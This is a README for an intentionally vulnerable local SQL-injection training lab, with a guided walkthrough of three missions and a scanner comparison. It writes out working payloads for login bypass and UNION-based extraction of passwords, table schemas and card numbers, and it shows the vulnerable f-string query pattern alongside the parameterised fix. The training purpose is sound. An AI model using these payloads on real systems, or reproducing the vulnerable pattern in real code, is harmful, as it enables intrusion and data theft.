# SQLi Attack Lab — be the attacker

> ⚠ **INTENTIONALLY VULNERABLE.** This is a local training range with a
> throwaway in-memory SQLite database. It listens on `127.0.0.1` only.
> Never deploy this file, never point it at real data, and never reuse its
> code patterns in a real application.

A tiny fake "ACME Corp" portal built the way vulnerable code really was
written: user input is stitched straight into SQL strings. Every page prints
the **exact SQL statement the server executed**, so you can watch your input
rewrite the query in real time. Three missions are tracked on the home page.

## Run it

```powershell
.\.venv\Scripts\python.exe testing\sqli_lab\app.py
# then open http://127.0.0.1:5003/
```

Hit **Reset lab** at any time to reseed the database and clear the missions.

## What's inside

| Route | Method | Query (simplified) | Columns |
|---|---|---|---|
| `/login` | POST | `SELECT * FROM users WHERE username = '<u>' AND password = '<p>'` | 6 |
| `/search?q=` | GET | `SELECT id, name, description FROM products WHERE name LIKE '%<q>%'` | 3 |
| `/orders?ref=` | GET | `SELECT id, order_ref, customer, card_number FROM orders WHERE order_ref = '<ref>'` | 4 |

Tables: `users` (incl. admin password), `products`, `orders` (fake card
numbers), `secrets` (contains the lab flag `VULNSCAN{...}`).

## Guided walkthrough (spoilers behind the details tags)

### Mission 1 — log in without the password

1. Try `admin` / `wrongpass` first and read the console: your input appears
   verbatim inside the query. No escaping, no parameterisation.
2. Username `admin` then a quote and a comment:
   ```
   admin' --
   ```
   Password: anything. The executed query becomes
   `SELECT * FROM users WHERE username = 'admin' --' AND password = 'whatever'`
   — the `--` comments out the password check. **You are the administrator.**
3. Variation: `' OR 1=1 --` logs you in as the first row in the table.
4. Payoff: the **Admin panel** link now appears — it lists every user with
   their password. That is what "privilege escalation" means in practice.

### Mission 2 — extract the users table with UNION

1. Search for a single quote `'` → the page shows a raw
   `sqlite3.OperationalError` (this error leak is itself a finding).
2. Column-count reconnaissance — break it first, then fix it:
   ```
   ' UNION SELECT 1,2 --            → error: 2 vs 3 columns
   ' UNION SELECT 1,2,3 --          → works, proves the count
   ```
3. Aim the UNION at a real table:
   ```
   ' UNION SELECT id, username, password FROM users --
   ```
   The users table now appears inside the product list.
4. Curious what else exists?
   ```
   ' UNION SELECT 1, name, sql FROM sqlite_master --
   ```

### Mission 3 — steal the flag

```
' UNION SELECT id, label, value FROM secrets --
```

The `VULNSCAN{...}` flag appears in the results. 3/3.

### Bonus — other people's orders (4 columns)

1. ```
   ' OR '1'='1
   ```
   Every order and card number, with no comment even needed.
2. ```
   ' UNION SELECT id, 'x', username || ':' || password, '0' FROM users --
   ```
   SQLite string concatenation pours the users table into the card column.

## Why it works — and how to fix it

The vulnerable pattern (marked `# VULNERABLE` in `app.py`):

```python
sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
rows = _conn.execute(sql)
```

The fixed version — user input travels **outside** the SQL text, so it can
never change the query structure:

```python
sql = "SELECT * FROM users WHERE username = ? AND password = ?"
rows = _conn.execute(sql, (username, password))
```

Same trick for f-string-built WHERE clauses: `WHERE name LIKE ?` with
`("%" + q + "%",)` as the parameter. This is exactly the remediation the
VulnScan knowledge base recommends for SQL Injection (A03:2021).

Note the deliberate escape hatch in this lab: output is HTML-escaped (so
this stays a *SQLi* lesson, not an XSS one) — escaping output does **not**
fix SQL injection, and parameterising queries does not fix XSS. Different
sinks, different fixes.

## Manual vs automated — same target, two attackers

Verified on 2026-10-12 with the local VulnScan deployment
(`OWASP Top 10 Full Scan`, target `http://127.0.0.1:5003/`):

| Result | Detail |
|---|---|
| Scan | 7 pages, 37 findings, completed |
| SQL Injection | **2 × Critical, Confirmed, CVSS 9.8** — params `q` and `ref`, evidence `database error signature 'sqlite3' appeared after injecting "'" ... reproduced 2/2` |
| Missing HTTP Security Headers | 35 findings (the lab serves no security headers) |

Honest comparison of the two attackers:

- The **scanner** found the same two GET-parameter injectable points you
  exploited by hand — error-based, reproducibly confirmed.
- The **login form** is a POST endpoint; VulnScan documents that it does not
  test POST bodies, form submission or authenticated flows. That is exactly
  the kind of gap manual testing covers — you proved it by bypassing the
  login while the scanner (correctly) said nothing about it.
- Try scanning the lab yourself from the VulnScan UI: New Scan →
  `http://127.0.0.1:5003/` → read the SQLi evidence and compare it with the
  query console in the lab.
